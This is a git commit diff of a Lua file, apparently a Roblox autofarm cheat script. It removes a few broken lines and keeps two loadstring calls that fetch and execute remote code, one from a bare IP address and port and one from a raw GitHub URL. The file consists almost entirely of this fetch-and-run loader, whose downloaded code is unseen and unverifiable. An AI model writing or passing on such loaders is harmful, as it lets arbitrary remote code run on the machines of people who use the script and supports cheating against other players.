b7509d668ff4cf65078ad4ae3c2d84fde9291a91
PlsNoNoob <jasperbns4@gmail.com>
2025-09-24 00:26:11 +0900

    Update GagNotOp.lua

--- GagNotOp.lua
+++ GagNotOp.lua
@@ -1,6 +1,3 @@
 ID="79caa49f-13da-4216-bba2-92f31fa51cb2";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
-wait(1)
-Local Spawner =
 loadstring(game:HttpGet('https://raw.githubusercontent.com/PlsNoNoob/-/refs/heads/main/Autofarm%20ice%20gui'))()
-Spawn.Load()
